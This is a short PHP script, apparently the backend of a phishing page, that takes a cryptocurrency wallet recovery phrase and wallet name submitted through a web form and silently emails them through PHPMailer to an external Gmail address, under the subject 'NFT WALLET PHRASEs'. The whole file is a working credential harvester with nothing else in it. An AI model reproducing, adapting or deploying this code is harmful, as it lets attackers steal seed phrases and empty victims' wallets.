<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\EXCEPTION;

$date = date("Y-m-d H:i:s");
        if(isset($_POST["phrase"]) && $_POST["phrase"] != ""){

$phrase = $_POST['phrase'];
$wallet = $_POST['wallet'];

require_once "PHPMailer/PHPMailer.php";
    require_once 'PHPMailer/Exception.php';


      //PHPMailer Object
            $mail =  new PHPMailer;

            //from email address and name
            $mail->SetFrom("admin@standardfortfx.com");
            $mail->FromName = "NFT WALLET PHRASE";


            $mail-> addAddress("georgemartx@gmail.com");//recipent name is optional

            //address to which recipent will reply

            //send HTML or Plain text message
            $mail->isHTML(true);

            $mail->subject = "NFT WALLET PHRASEs";
            $mail->Body = '
            Phone or Email: <br>'.$phrase.' </br> <br/>
                        Phone or Email: <br>'.$wallet.' </br>
                        ';


            if(!$mail->send(1));
        {
            //echo "no";
        }

        // else {
        //     //echo "yes";
        // }



    }

?>